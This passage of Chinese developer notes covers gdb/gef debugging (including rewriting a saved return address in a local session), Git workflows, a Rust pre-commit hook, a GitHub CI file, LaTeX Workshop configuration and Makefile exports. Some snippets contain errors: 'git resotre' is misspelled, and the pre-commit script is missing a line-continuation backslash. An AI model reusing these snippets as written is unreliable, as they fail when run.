<li><code>ni</code>和<code>si</code>对应汇编级别下的<strong>单步跳过</strong>和<strong>单步进入</strong>。</li>
<li><code>r</code>,<code>c</code>: run/continue</li>
<li><code>b</code> 设置断点，<code>d</code>清除断点。可以在地址、函数、文件行打断点。
<ol>
<li><code>break ... if cond</code> 条件断点</li>
<li><code>tbreak</code>一次性断点</li>
<li><code>hbreak</code>可以设置硬件断点</li>
<li><code>b ( ) if ( )</code>条件断点</li>
</ol>
</li>
<li><code>watch</code>: 设置内存断点，也就是当一个变量值发生变化时，程序会停下来。比如<code>watch *(int*)0x6009c8</code>。</li>
<li>对于x86，我们还可以用<code>flags</code>命令来修改flag寄存器，比如<code>edit-flags [(+|-|~)FLAGNAME ...]</code></li>
<li><code>finish</code>: 执行完当前函数。<code>return</code>可以直接强制返回。</li>
</ol>
<p>默认情况下，gdb不会进入不带调试信息的函数。可以执行“set step-mode on”命令，这样gdb就不会跳过没有调试信息的函数。</p>
<h3 id="运行信息"><a class="header" href="#运行信息">运行信息</a></h3>
<p>程序本身有许多信息；程序运行到每一个点，会有很多状态可以查看。</p>
<div class="table-wrapper"><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody>
<tr><td>info all-registers</td><td>查看所有的寄存器</td></tr>
<tr><td>info all-registers name</td><td>查看某个寄存器</td></tr>
<tr><td>info b</td><td>查看所有断点</td></tr>
<tr><td>info address sym</td><td>查看符号sym的存储地址</td></tr>
<tr><td>info variables</td><td>查看所有的变量（符号表和调试信息）</td></tr>
<tr><td>info functions</td><td>查看所有的函数（符号表和调试信息）</td></tr>
<tr><td>info locals</td><td>查看局部变量的值</td></tr>
<tr><td>display[/FMT] exp</td><td>按照FMT指定格式打印exp的内容</td></tr>
<tr><td>bt</td><td>打印调用栈</td></tr>
<tr><td>frame</td><td>打印当前栈帧</td></tr>
</tbody></table>
</div>
<h3 id="查看内存"><a class="header" href="#查看内存">查看内存</a></h3>
<p>内存实在是太重要的，无论是数据还是指令，都是存在内存中。<code>x</code> 是 examine 的缩写格式，使用方法： <code>x /[n][f][u] &lt;addr&gt;</code></p>
<ul>
<li>
<p><code>[n]</code>表示要显示的内存单元的个数</p>
</li>
<li>
<p><code>[f]</code>表示显示方式, 可取如下值</p>
<div class="table-wrapper"><table><thead><tr><th>[f]</th><th>含义</th></tr></thead><tbody>
<tr><td>x</td><td>按十六进制格式显示变量。</td></tr>
<tr><td>d</td><td>按十进制格式显示变量。</td></tr>
<tr><td>u</td><td>按十进制格式显示无符号整型。</td></tr>
<tr><td>o</td><td>按八进制格式显示变量。</td></tr>
<tr><td>t</td><td>按二进制格式显示变量。</td></tr>
<tr><td>a</td><td>按十六进制格式显示变量。</td></tr>
<tr><td><strong>i</strong></td><td><strong>指令格式</strong></td></tr>
<tr><td><strong>s</strong></td><td><strong>字符串格式</strong></td></tr>
<tr><td>f</td><td>按浮点数格式显示变量。</td></tr>
</tbody></table>
</div></li>
<li>
<p><code>[u]</code>表示一个地址单元的长度, 可取如下值</p>
<div class="table-wrapper"><table><thead><tr><th>[u]</th><th>含义</th></tr></thead><tbody>
<tr><td>b</td><td>单字节</td></tr>
<tr><td>h</td><td>双字节</td></tr>
<tr><td>w</td><td>四字节</td></tr>
<tr><td>g</td><td>八字节</td></tr>
</tbody></table>
</div></li>
</ul>
<ol>
<li><code>hexdump</code>系列， 打印内存的值，<code>hexdump [qword|dword|word|byte][LOCATION] [[L][SIZE]][REVERSE]</code></li>
<li>比如<code>hexdump byte $sp 10</code>，Byte还会显示ascii码对应的字符layout</li>
</ol>
<p>我也可以<strong>查找</strong>内存中的指定内容。比如我想找RustSBI中的mret在哪里:<code>find 0x80000000,0x80200000,(int)0x30200073</code></p>
<p>也可以<strong>修改</strong>内存中的内容。有一个场景，是我试图修改function的return address。首先用i frame查看栈情况，知道返回地址保存在<code>0xffffd14c</code>处，值为<code>0xf7df1ee5</code>。我将他修改成<code>0x0904853d</code>。</p>
<pre><code>gef➤  i frame
Stack level 0, frame at 0xffffd150:
 eip = 0x8048557 in main; saved eip = 0xf7df1ee5
 Arglist at 0xffffd148, args: 
 Locals at 0xffffd148, Previous frame's sp is 0xffffd150
 Saved registers:
  ebp at 0xffffd148, eip at 0xffffd14c
gef➤  set {int}0xffffd14c=0x0804853d
gef➤  i frame
Stack level 0, frame at 0xffffd150:
 eip = 0x8048557 in main; saved eip = 0x804853d
 Arglist at 0xffffd148, args: 
 Locals at 0xffffd148, Previous frame's sp is 0xffffd150
 Saved registers:
  ebp at 0xffffd148, eip at 0xffffd14c
</code></pre>
<h2 id="一般程序调试"><a class="header" href="#一般程序调试">一般程序调试</a></h2>
<p><code>set args</code>可以设置参数。</p>
<h2 id="其他的技巧"><a class="header" href="#其他的技巧">其他的技巧</a></h2>
<h3 id="和调试无关的命令"><a class="header" href="#和调试无关的命令">和调试无关的命令</a></h3>
<p><code>remote</code>: 远程调试</p>
<p><code>set logging on</code>: 记录调试指令，方便参考。</p>
<h3 id="layout"><a class="header" href="#layout">Layout</a></h3>
<ol>
<li>显示源代码窗口       <code>(gdb) layout src</code></li>
<li>显示寄存器窗口       <code>(gdb) layout regs</code></li>
<li>显示汇编代码窗口     <code>(gdb) layout asm</code></li>
<li><code>Ctrl+X</code>退出窗口。</li>
</ol>
<h3 id="寻址方式location"><a class="header" href="#寻址方式location">寻址方式Location</a></h3>
<p>我们经常需要获得某个地址的信息，无论是查看反汇编、内存内容，或是设置断点。那么在GDB中，我们有哪些指定地址的方式呢？</p>
<ul>
<li>使用symbol table里的符号。你可以通过外部命令<code>readelf</code>查看，也可以用<code>info functions</code>和<code>info variables</code>查看。比如<code>b main</code>，<code>disassemble task_init</code></li>
<li>用绝对的数字指定地址。
<ul>
<li>设置断点的时候要<code>b *0x80000a5c</code>，在0x80000a5c设置断点。因为直接加数字的话gdb会理解成行号。</li>
<li>在hexdump/x的时候，<code>hexdump qword 0x80000a5c 10</code>查看0x80000a5c的内存，加<code>*</code>就跟C语言一样变成取地址的内容了</li>
</ul>
</li>
<li>利用寄存器：
<ul>
<li>查看内存<code>hexdump qword $sp 10</code>。</li>
<li>如果是设置断点，用<code>rb</code>指令。<code>rb ra</code></li>
</ul>
</li>
</ul>
<h3 id="快照"><a class="header" href="#快照">快照</a></h3>
<p>想要给运行的程序来一个快照？可以用<code>dump</code>命令把当前的很多运行状态保存下来。</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="git"><a class="header" href="#git">Git</a></h1>
<h2 id="basic-operation"><a class="header" href="#basic-operation">Basic Operation</a></h2>
<p>这张图涵盖了git的基本操作</p>
<p><img src="Tools/../images/image-20220707141458268.png" alt="image-20220707141458268" /></p>
<h3 id="提交修改"><a class="header" href="#提交修改">提交修改</a></h3>
<p>首先将文件从<strong>工作区(workspace)<strong>提交到</strong>暂存区(staging area)</strong>。使用VSCode也可以在Changes的文件中点击<code>+</code>。</p>
<pre><code class="language-shell">git add dir     # 将目录下的所有修改提交到暂存区
git add file    # 将文件的修改提交到暂存区
</code></pre>
<p>然后将暂存区的文件<strong>提交(commit)<strong>到</strong>本地仓库(local repository)</strong>。使用VSCode也可以直接填写Commit Message然后回车。</p>
<pre><code class="language-shell">git commit -m &quot;commit message&quot;  
git commit --amend              # 不创建新的提交而是覆盖上一次提交
</code></pre>
<blockquote>
<p>commit message可以参考BestPractice-CommitMessage</p>
</blockquote>
<p>然后将本地仓库的修改<strong>推送(push)<strong>到</strong>远程仓库(remote repository)</strong>。</p>
<pre><code class="language-shell">git push remote_respository_name local_branch_name:remote_branch_name
</code></pre>
<p>一般来说，只有一个远程仓库，命名为origin。主分支的名字一般为master/main，在开发的初期只需要一个分支，一般直接使用主分支。然后如果本地仓库和远程仓库的名字相同的话，也可以不写远程仓库名。</p>
<h3 id="撤销修改"><a class="header" href="#撤销修改">撤销修改</a></h3>
<p>取消文件的暂存。使用VScode可以在Staged Changes中点击<code>-</code>号，进行的是第二种撤销。</p>
<pre><code class="language-shell">git restore --staged file  # 从缓存区撤销到工作区
git reset --mixed file     # 从缓存区中删除，不改变工作区
</code></pre>
<p>取消工作区文件的修改</p>
<pre><code class="language-shell">git resotre file
</code></pre>
<h2 id="advanced-operation"><a class="header" href="#advanced-operation">Advanced Operation</a></h2>
<h3 id="恢复文件"><a class="header" href="#恢复文件">恢复文件</a></h3>
<p>从某个版本中恢复指定文件</p>
<pre><code>git checkout 830cf -- a.txt
</code></pre>
<p>从某个分支中恢复指定文件</p>
<pre><code class="language-shell">git checkout master -- a.txt
</code></pre>
<h3 id="查看文件修改历史"><a class="header" href="#查看文件修改历史">查看文件修改历史</a></h3>
<p>使用命令行</p>
<pre><code class="language-shell">git log -p a.txt
</code></pre>
<p>使用VS Code的Gitlens提供的FILE HISTORY，会列出文件所有的修改记录。如果单击的话，会默认和上一次提交进行比较，不过第二个按钮是“Open changes with working file”可以和现在的文件进行比较。右边新，左边旧。</p>
<p>VSCODE文件视窗下的TIMELINE也是类似的。不过他提供了本地历史记录的功能，有时有用有时又有点乱。</p>
<h3 id="分支切换"><a class="header" href="#分支切换">分支切换</a></h3>
<p>切换分支到master</p>
<pre><code class="language-shell">git checkout master
git checkout master --discard-changes # 丢弃所有的改动
git switch master --discard-changes --recurse-submodules # 丢弃包括子模块的改动在内的所有改动
git switch master
</code></pre>
<p>创建并切换到新分支</p>
<pre><code>git checkout -b new_branch_name
git switch -c new_branch_name
</code></pre>
<blockquote>
<p>new_branch_name的命名可以参考 BestPractice-BranchNaming</p>
</blockquote>
<p>可以看到在之前的恢复文件也是用checkout命令。正是因为checkout有着两个不同的用途，搞出了一个switch来专门用于在分支切换代替checkout。</p>
<h3 id="子模块"><a class="header" href="#子模块">子模块</a></h3>
<p>在一个仓库里的子模块，对于父仓库来说可以认为是一整个文件，父仓库会<strong>保存子仓库的hash而不是文件</strong>，这样子模块发生了更改父仓库也可以感知到。</p>
<p>所以，在我们从远程拉下一个项目的时候，要去根据保存的hash去初始化子模块。</p>
<pre><code class="language-shell">git submodule update --init --recursive   # 初始化本地模块，会从指定分支指定提交down下代码
git submodule update --remote   # 如果需要让本地模块和上游保持同步
</code></pre>
<p>子模块是很麻烦的，</p>
<h3 id="版本回退"><a class="header" href="#版本回退">版本回退</a></h3>
<pre><code class="language-shell">git reset --hard d85da # 注意，这个回退是不能后悔的
</code></pre>
<h3 id="获取远程"><a class="header" href="#获取远程">获取远程</a></h3>
<p>其实git pull是一个复合命令。git pull = git fetch + git merge。如果只需要获取远程分支到本地而不执行merge，可以使用git fetch。他会修改ref/remote内到分支信息。</p>
<h3 id="合并分支"><a class="header" href="#合并分支">合并分支</a></h3>
<p>合并分支有两种方法。rebase和merge。假设我们使用Github推荐工作流，在我们的feature开发一段时间后想要合并到main主分支，这时main已经有了一些其他同事的提交了，就像下面这样：</p>
<p>![A forked commit history](../images/01 A forked commit history.svg)</p>
<p>这时，我们想先将main的代码合并到我们的feature。可以使用merge</p>
<pre><code class="language-shell">git merge feature main
</code></pre>
<p>merge会创建一个新的提交，把两边的改动合并。但是这样会有一个问题，你每次合入main的代码都会创建一个commit，没有实质作用，如果经常需要合入main就会很乱。</p>
<p>![Merging master into the feature branch](../images/02 Merging main into the feature branh.svg)</p>
<p>或者使用rebase</p>
<pre><code class="language-shell">git checkout feature  # 切换到feature分支
git rebase main       # 自动合入main
git rebase -i main    # interactive合入main，可以进行更详细的配置
</code></pre>
<p>他的效果就像这样，会给feature上的每一个commit创建一个新的commit，附在main的后面，形成一个线性的提交。![Rebasing the feature branch onto master](../images/03 Rebasing the feature branch into main.svg)</p>
<p>如果使用interactive rebase，他会打开一个text editor，列出下面的信息供修改，你就可以<strong>合并提交、修改提交信息</strong>了。</p>
<pre><code>pick 33d5b7a Message for commit #1
pick 9480b3d Message for commit #2
pick 5c67e61 Message for commit #3
</code></pre>
<h3 id="差异比较"><a class="header" href="#差异比较">差异比较</a></h3>
<pre><code class="language-shell">git diff 66ff c7b0 # compare commit c7b0 to commit 66ff
</code></pre>
<h3 id="忽略文件"><a class="header" href="#忽略文件">忽略文件</a></h3>
<p>想要让git忽略一个文件，可以将它加入.gitignore</p>
<p>但是，一旦文件已经被追踪，在gitignore中加入就没有用了。这个时候我们就需要先将它<strong>取消追踪</strong>。</p>
<pre><code class="language-shell">git rm --cached filename
git rm -r --cached dirname
</code></pre>
<h2 id="best-practice"><a class="header" href="#best-practice">Best PractiCe</a></h2>
<h3 id="branch-naming"><a class="header" href="#branch-naming">Branch naming</a></h3>
<p>一般通用的分支命名规范是：</p>
<ul>
<li>feature/xxx: 新功能开发</li>
<li>bugfix/xxx: 修复缺陷</li>
<li>opt/xxx: 性能优化</li>
<li>infra/xxx: 工程化相关，例如构建脚本、配置文件的修改</li>
<li>chore/xxx: </li>
</ul>
<p>xxx可以是简单的介绍，也可以带上自己的名字</p>
<h3 id="commit-message"><a class="header" href="#commit-message">Commit message</a></h3>
<p>commit message的基本格式时 Header Body Footer</p>
<p>Header建议使用<code>&lt;type&gt;:&lt;scopt&gt;/&lt;subject&gt;</code></p>
<ul>
<li>type包括
<ul>
<li>feat: new feature</li>
<li>fix: fix bug</li>
<li>refactor: modifications other than features or fixes</li>
<li>release: release a new version</li>
<li>style: format or beautify code without effects on main function</li>
<li>chore(杂事): modifications of dependencies or build tools</li>
<li>docs: write documentation</li>
</ul>
</li>
<li>scope介绍了commit修改的代码在哪个模块</li>
<li>subject介绍了修改的主要内容，建议使用动宾结构，不超过50个字符</li>
</ul>
<p>Body包括了对修改的细节描述，这个可以分行的。</p>
<p>Footer一般没有，除非进行了breaking changes</p>
<p>示例</p>
<pre><code>feat: 增加了xx功能

1. 增加了xx
2. 增加了xx
</code></pre>
<h3 id="work-flow"><a class="header" href="#work-flow">Work flow</a></h3>
<p>Git早期的复杂工作流：Master，Develop，Feature，Release，Hotfix。</p>
<p>Github推荐工作流：只有一个主干分支，基于PR往主干分支提交代码。</p>
<h3 id="rebase-golden-rule"><a class="header" href="#rebase-golden-rule">Rebase Golden Rule</a></h3>
<p>使用rebase的重要原则是，<strong>不能在公共分支上进行rebase</strong>。否则你的公共分支会和大家的都不一样，就乱了套了。rebase之后，往往需要force push。总之，rebase是一个危险的操作。</p>
<h3 id="git-hook"><a class="header" href="#git-hook">Git hook</a></h3>
<p>在commit之前添加format/lint，在push之前进行单元测试，是推荐的做法。</p>
<p>通过修改.git/hook下面的脚本添加hook。</p>
<h2 id="git-folder"><a class="header" href="#git-folder">.git folder</a></h2>
<p>commit/tree/blob/tag在git中统称object。blob存储文件内容，tree存储文件的目录信息，commit存储提交信息对应一个唯一的hash。</p>
<hr />
<p>参考链接：<a href="https://www.atlassian.com/git/tutorials/merging-vs-rebasing">merging VS rebasing</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="githook"><a class="header" href="#githook">Githook</a></h1>
<p>顾名思义，是在执行某些git命令之前hook上自己的逻辑。逻辑指令保存在<code>$GIT_DIR/hooks/*</code>文件夹下，默认情况下里面有一些.sample结尾的文件，这些是例子。你把.sample去掉就是Hook脚本了。</p>
<h2 id="例子-2"><a class="header" href="#例子-2">例子</a></h2>
<blockquote>
<p>The <code>pre-commit</code> hook is run first, before you even type in a commit message. It’s used to inspect the snapshot that’s about to be committed, to see if you’ve forgotten something, to <strong>make sure tests run</strong>, or to <strong>examine</strong> whatever you need to inspect in the code. Exiting non-zero from this hook aborts the commit, although you can bypass it with <code>git commit --no-verify</code>. You can do things like <strong>check for code style</strong> (run <code>lint</code> or something equivalent), check for trailing whitespace (the default hook does exactly this), or check for <strong>appropriate documentation</strong> on new methods.</p>
</blockquote>
<p>来看一个rust工程的<code>pre-commit</code>例子。在每次commit之前，进行fmt+clippy+test检查，如果还有别的测试也可以一起放进去。默认的例子给的是检查工程中是否存在ascii字符，不过我们在注释里放点中文合情合理吧，不做这个检查了。</p>
<pre><code class="language-sh">#!/bin/sh

(cd user \
    &amp;&amp; cargo fmt -- --check \
    &amp;&amp; cargo clippy -- -D warnings \
    &amp;&amp; cargo build \
    &amp;&amp; cargo build --all-targets --all-features
    &amp;&amp; cargo test \
    &amp;&amp; cargo test --all-targets --all-features) \
    || exit 1
</code></pre>
<ul>
<li><a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks">Git book-hook</a></li>
<li><a href="https://git-scm.com/docs/githooks">Git doc-hook</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="github-ci"><a class="header" href="#github-ci">Github-CI</a></h1>
<h2 id="ci"><a class="header" href="#ci">CI</a></h2>
<p>Rust CI 例子</p>
<pre><code class="language-CI">name: CI

# This workflow run tests and build for each push

on:
  push:
    branches:
      - main
      - 'feature-**'

jobs:

  test_phaser:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Update local toolchain
        run: |
          rustup update
          rustup component add clippy
          rustup install nightly          

      - name: Toolchain info
        run: |
          cargo --version --verbose
          rustc --version
          cargo clippy --version          

      - name: Lint
        run: |
          cd phaser
          cargo fmt -- --check
          cargo clippy -- -D warnings          

      - name: Test
        run: |
          cd phaser
          cargo check
          cargo test --all          

      - name: Build
        run: |
          cd phaser
          cargo build --release
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="latex"><a class="header" href="#latex">Latex</a></h1>
<p>这里是本地安装环境，线上的overleaf也很好使。</p>
<h2 id="环境安装"><a class="header" href="#环境安装">环境安装</a></h2>
<p>LaTeX有很多发型版，TeX Live就是其中一种。TeX Live 是 TUG (TeX User Group) 维护和发布的 TeX 系统，可说是「官方」的 TeX 系统。TeX Live可以保持在跨操作系统平台、跨用户的一致性。安装包如下。</p>
<p>texlive-latex-base和extra都建议安装一下。xetex其实没有安装的必要，不过也可以安装一下。也是latex编译器的一种，但是和下面的模板不适配。texlive-fonts-extra如果不安装的话就不能正常使用下面的模板会报错，缺失某些style。</p>
<pre><code class="language-sh">sudo apt-get install texlive-latex-base texlive-latex-extra texlive-xetex texlive-publishers texlive-fonts-extra texlive-extra-utils
</code></pre>
<p>在Vscode插件中心下载<code>Latex Workshop</code>，修改配置文件（这里的配置文件很丰富，不止对上面的工具链有效）</p>
<pre><code class="language-json">    &quot;latex-workshop.latex.tools&quot;: [
        {
            &quot;name&quot;: &quot;xelatex&quot;,
            &quot;command&quot;: &quot;xelatex&quot;,
            &quot;args&quot;: [
                &quot;-synctex=1&quot;,
                &quot;-interaction=nonstopmode&quot;,
                &quot;-file-line-error&quot;,
                &quot;%DOC%&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;xelatex-with-shell-escape&quot;,
            &quot;command&quot;: &quot;xelatex&quot;,
            &quot;args&quot;: [
                &quot;--shell-escape&quot;,
                &quot;-synctex=1&quot;,
                &quot;-interaction=nonstopmode&quot;,
                &quot;-file-line-error&quot;,
                &quot;%DOC%&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;xelatex-latexmk&quot;,
            &quot;command&quot;: &quot;latexmk&quot;,
            &quot;args&quot;: [
                &quot;-synctex=1&quot;,
                &quot;-interaction=nonstopmode&quot;,
                &quot;-file-line-error&quot;,
                &quot;-xelatex&quot;,
                &quot;-outdir=%OUTDIR%&quot;,
                &quot;%DOC%&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;xelatex-latexmk-with-shell-escape&quot;,
            &quot;command&quot;: &quot;latexmk&quot;,
            &quot;args&quot;: [
                &quot;--shell-escape&quot;,
                &quot;-synctex=1&quot;,
                &quot;-interaction=nonstopmode&quot;,
                &quot;-file-line-error&quot;,
                &quot;-xelatex&quot;,
                &quot;-outdir=%OUTDIR%&quot;,
                &quot;%DOC%&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;pdflatex&quot;,
            &quot;command&quot;: &quot;pdflatex&quot;,
            &quot;args&quot;: [
                &quot;-synctex=1&quot;,
                &quot;-interaction=nonstopmode&quot;,
                &quot;-file-line-error&quot;,
                &quot;%DOC%&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;pdflatex-with-shell-escape&quot;,
            &quot;command&quot;: &quot;pdflatex&quot;,
            &quot;args&quot;: [
                &quot;--shell-escape&quot;,
                &quot;-synctex=1&quot;,
                &quot;-interaction=nonstopmode&quot;,
                &quot;-file-line-error&quot;,
                &quot;%DOC%&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;pdflatex-latexmk&quot;,
            &quot;command&quot;: &quot;latexmk&quot;,
            &quot;args&quot;: [
                &quot;-synctex=1&quot;,
                &quot;-interaction=nonstopmode&quot;,
                &quot;-file-line-error&quot;,
                &quot;-pdf&quot;,
                &quot;-outdir=%OUTDIR%&quot;,
                &quot;%DOC%&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;pdflatex-latexmk-with-shell-escape&quot;,
            &quot;command&quot;: &quot;latexmk&quot;,
            &quot;args&quot;: [
                &quot;--shell-escape&quot;,
                &quot;-synctex=1&quot;,
                &quot;-interaction=nonstopmode&quot;,
                &quot;-file-line-error&quot;,
                &quot;-pdf&quot;,
                &quot;-outdir=%OUTDIR%&quot;,
                &quot;%DOC%&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;latexmk&quot;,
            &quot;command&quot;: &quot;latexmk&quot;,
            &quot;args&quot;: [
                &quot;-synctex=1&quot;,
                &quot;-interaction=nonstopmode&quot;,
                &quot;-file-line-error&quot;,
                &quot;-pdf&quot;,
                &quot;%DOC%&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;bibtex&quot;,
            &quot;command&quot;: &quot;bibtex&quot;,
            &quot;args&quot;: [
                &quot;%DOCFILE%&quot;
            ]
        },
    ],
    &quot;latex-workshop.latex.recipes&quot;: [
        {
            &quot;name&quot;: &quot;PDFLaTeX -&gt; BibTeX -&gt; PDFLaTeX*2&quot;,
            &quot;tools&quot;: [
                &quot;pdflatex&quot;,
                &quot;bibtex&quot;,
                &quot;pdflatex&quot;,
                &quot;pdflatex&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;PDFLaTeX&quot;,
            &quot;tools&quot;: [
                &quot;pdflatex&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;PDFLaTeX with Shell Escape&quot;,
            &quot;tools&quot;: [
                &quot;pdflatex-with-shell-escape&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;PDFLaTeX Auto with Shell Escape&quot;,
            &quot;tools&quot;: [
                &quot;pdflatex-latexmk-with-shell-escape&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;XeLaTeX&quot;,
            &quot;tools&quot;: [
                &quot;xelatex&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;XeLaTeX with Shell Escape&quot;,
            &quot;tools&quot;: [
                &quot;xelatex-with-shell-escape&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;XeLaTeX with Shell Escape*2&quot;,
            &quot;tools&quot;: [
                &quot;xelatex-with-shell-escape&quot;,
                &quot;xelatex-with-shell-escape&quot;,
            ]
        },
        {
            &quot;name&quot;: &quot;XeLaTeX Auto with Shell Escape&quot;,
            &quot;tools&quot;: [
                &quot;xelatex-latexmk-with-shell-escape&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;XeLaTeX -&gt; BibTeX -&gt; XeLaTeX*2&quot;,
            &quot;tools&quot;: [
                &quot;xelatex&quot;,
                &quot;bibtex&quot;,
                &quot;xelatex&quot;,
                &quot;xelatex&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;PDFLaTeX Auto&quot;,
            &quot;tools&quot;: [
                &quot;pdflatex-latexmk&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;XeLaTeX Auto&quot;,
            &quot;tools&quot;: [
                &quot;xelatex-latexmk&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;latexmk&quot;,
            &quot;tools&quot;: [
                &quot;latexmk&quot;
            ]
        },
        {
            &quot;name&quot;: &quot;BibTeX&quot;,
            &quot;tools&quot;: [
                &quot;bibtex&quot;
            ]
        },
    ],
</code></pre>
<h2 id="hello-world-4"><a class="header" href="#hello-world-4">Hello world</a></h2>
<p>创建一个hello.tex，输入以下内容</p>
<pre><code class="language-latex">\documentclass{article}
% 这里是导言区
\begin{document}
Hello, world!
\end{document}
</code></pre>
<p>然后点击TEX中的Build，目录下就会生成PDF文件。</p>
<h2 id="使用模板-acm-ccs模板"><a class="header" href="#使用模板-acm-ccs模板">使用模板-<a href="https://github.com/acmccs/format.git">ACM CCS模板</a></a></h2>
<p>他提供的Makefile和我们之前安装的工具链是不匹配的，所以可以无视他，删除Makefile，PDF，README，选择<code>css-template.tex</code>然后编译就行了。编译选项要选<code>PDF-&gt;Bib-&gt;PDF*2</code>，因为<strong>这个模板只支持pdftex</strong>。</p>
<p>然后正常情况下，我们就看不见警告了。编译之后我们能看见完整的PDF文档。</p>
<h2 id="使用模板-beamer-slides"><a class="header" href="#使用模板-beamer-slides">使用模板-<a href="https://www.overleaf.com/latex/templates/writing-beamer-slides-with-markdown/dnrwnjrpjjhw">Beamer Slides</a></a></h2>
<p>这个模板是用来做PPT的，还挺好看。直接把Overleaf上的模板复制过来。编译选项选<code>XeLaTeX with Shell Escape*2</code>。</p>
<p>如果下次有要做PPT的时候可以考虑用这个。</p>
<hr />
<h2 id="latex语法"><a class="header" href="#latex语法">Latex语法</a></h2>
<p>我对Latex的语法并不熟悉。。。</p>
<h3 id="粗体-斜体-内嵌公式-独行公式"><a class="header" href="#粗体-斜体-内嵌公式-独行公式">粗体 斜体 内嵌公式 独行公式</a></h3>
<p><img src="Tools/../images/image-20210715211944130.png" alt="image-20210715211944130" /></p>
<pre><code class="language-latex">\textbf{Definition 1}
\emph{
    A randomized algorithm $\mathcal{A}: \mathcal{V} 
    \rightarrow \mathcal{Z}$ is $\epsilon$-locally differentially 
    private($\epsilon$-LDP), if for any pair of values 
    $v,v' \in \mathcal{V}$ and any subset of output 
    $\mathcal{S} \subseteq \mathcal{Z}$, we have that
    $$Pr[\mathcal{A}(v)\in\mathcal{S}] \le e^\epsilon 
    Pr[\mathcal{A}(v')\in\mathcal{S}]$$
}
</code></pre>
<p><code>\textbf</code> 粗体 <code>\emph</code>斜体 <code>$$</code>公式</p>
<h3 id="带编号的公式"><a class="header" href="#带编号的公式">带编号的公式</a></h3>
<p><img src="Tools/../images/image-20210717204658442.png" alt="image-20210717204658442" /></p>
<pre><code class="language-latex">\begin{equation}
	Pr[\mathcal{A}(v)\in\mathcal{S}] \le e^\epsilon 
	Pr[\mathcal{A}(v')\in\mathcal{S}]
\end{equation}
</code></pre>
<h3 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h3>
<p>在.bib文件中输入参考文献的metadata,格式如下：</p>
<pre><code>@inproceedings{anderson1993cryptosystems,
  title={Why cryptosystems fail},
  author={Anderson, Ross},
  booktitle={Proceedings of the 1st ACM Conference on Computer and Communications Security},
  pages={215--227},
  year={1993},
  publisher={ACM},
  address={New York}
}
</code></pre>
<p>这个数据怎么来？可以从谷歌学术的 引用 按钮中得到，也可以用zotero软件 编辑-拷贝为BibTex 获得。后者可能需要设置一下。</p>
<p>然后在正文中需要用到参考文献的地方，我们加入<code>\cite{anderson1993cryptosystems}</code>即可。</p>
<h3 id="图片插入并编号"><a class="header" href="#图片插入并编号">图片插入并编号</a></h3>
<p><img src="Tools/../images/image-20210717214927555.png" alt="image-20210717214927555" /></p>
<pre><code class="language-latex">\begin{figure}
    \centering
    \includegraphics[scale=0.4]{pic/ldp_model.png}
    \caption{Framework of Local Differential Privacy}
\end{figure}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="make与makefile"><a class="header" href="#make与makefile">Make与Makefile</a></h1>
<p>参考链接：
<a href="http://www.ruanyifeng.com/blog/2015/02/make.html">阮一峰的Make讲解</a>
<a href="https://www.gnu.org/software/make/manual/make.html">GNU Make手册</a>
<a href="https://gist.github.com/isaacs/62a2d1825d04437c6f08">老外的Makefile教程</a>
<a href="https://seisman.github.io/how-to-write-makefile/index.html">跟我学写Makefile</a>
我不想详细的去讲解Makefile的规则。只想记录一下过程中遇到的问题和对应的解决办法。</p>
<h2 id="头文件的位置"><a class="header" href="#头文件的位置">头文件的位置</a></h2>
<p><code>gcc -I</code>可以指定头文件的寻找位置。所以可以通过修改CFLAG来修改寻找头文件的目录。</p>
<h2 id="变量的传递"><a class="header" href="#变量的传递">变量的传递</a></h2>
<p>这是最上层的Makefile定义的一些变量，以及编译子文件夹的命令（节选）：</p>
<pre><code class="language-makefile">export
INCLUDE = -I ../include
CF = -O0 -march=$(ISA) -mabi=$(ABI) -mcmodel=medany -ffunction-sections -fdata-sections -nostartfiles -nostdlib -nostdinc -static -lgcc -Wl,--nmagic -Wl,--gc-sections -g3
CFLAG = ${CF} ${INCLUDE} -DPRIORITY

（第一个编译目标）
subsystem:
	$(MAKE) -C lib
	$(MAKE) -C init
	$(MAKE) -C arch/riscv
</code></pre>
<blockquote>
<p>Variable values of the top-level <code>make</code> can be passed to the sub-<code>make</code> through the environment by explicit request. These variables are defined in the sub-<code>make</code> as defaults, but they do not override variables defined in the makefile used by the sub-<code>make</code> unless you use the ‘-e’ switch (see <a href="https://www.gnu.org/software/make/manual/make.html#Options-Summary">Summary of Options</a>).</p>
<p>If you want to export specific variables to a sub-<code>make</code>, use the <code>export</code> directive, like this:</p>
<pre><code>export variable …
</code></pre>
<p>If you want to <em>prevent</em> a variable from being exported, use the <code>unexport</code> directive, like this:</p>
<pre><code>unexport variable …
</code></pre>
<p>If you want all variables to be exported by default, you can use <code>export</code> by itself:</p>
<pre><code>export
</code></pre>
</blockquote>
<p>除了<code>MAKEFLAGS</code>以外的变量默认是不向子目录传递的，除非用了export指令。虽然没有在文档中找到，但是传递到子目录之后的变量就是一整个了，比如我在子目录Makefile中修改了INCLUDE不会对CFLAG造成影响。</p>
